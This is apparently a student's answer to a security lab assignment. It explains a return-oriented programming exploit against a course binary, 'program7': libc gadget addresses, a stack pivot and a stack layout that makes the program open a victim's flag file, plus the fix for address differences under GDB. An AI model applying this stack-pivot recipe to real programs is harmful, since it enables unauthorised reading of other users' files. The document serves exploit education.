Please provide an explanation about how you generate the payload for program7 to read victim's secret.

- ROP gadgets & syscalls used:
1.
0x00107022
0xf7e71b51: (0xf7de1000 + 0x00090b51)
pop esi; pop ebx; ret
from libc

2.
0xf7f04060: (0xf7de1000 + 0x00123060)
pop esp; ret
from libc

3.
0x565562e0:
call 0x565560a0 (fopen)
from main() function



- The layout and expected behavior (per gadget) of your exploit code on the stack:
Starting address is 0xffffde30:
[0x565562e0][0xffffde3e][0xffffde3c]["r""/home/victim/flag.txt"][0xffffd410][0xf7e71b51][0x5655a160][0x56559000][0xf7f04060][0xffffde30]

1. Return address of function `trickme()` is overwritten to 0xf7e71b51 (pop esi ; pop ebx ; ret).
   When `trickme()` does `ret`, it executes `pop esi; pop ebx; ret`.
   It sets esi to 0x5655a160 and ebx to 0x56559000. `ret` goes to the next code.

2. Next code is at 0xf7f04060 (pop esp; ret).
   It sets esp to 0xffffde30 (start of buf). `ret` goes to the next code.

3. Next code is at 0x565562e0 (call 0x565560a0 (fopen)).
   `fopen()` use the value stored at the stack, which are 0xffffde3e("r") and 0xffffde3c("/home/victim/flag.txt").
   It reads file at this path `/home/victim/flag.txt`.

4. 0xffffd410 (esp) is the esp value to make the program execute normally.



- Did you meet the problem that addresses inside/outside GDB are different? If so, how did you overcome it?
Yes.
I add `printf("buf address %p\n", buf);` after declaring variable buf in program7.c to see the actual address in run time.
(0xffffde30)
Then I use gdb with `unset environment` on to see buf's address.
(0xffffdd40)
I calculate an offset between these two values.
(gdb) p/x 0xffffde30 - 0xffffdd40
$1 = 0xf0
The actual address during runtime should be address found in gdb with original program7.c's compiled binary minus 0xf0
(gdb) p/x buf - 0xf0
$2 = 0xffffd3e0



- Other comments:

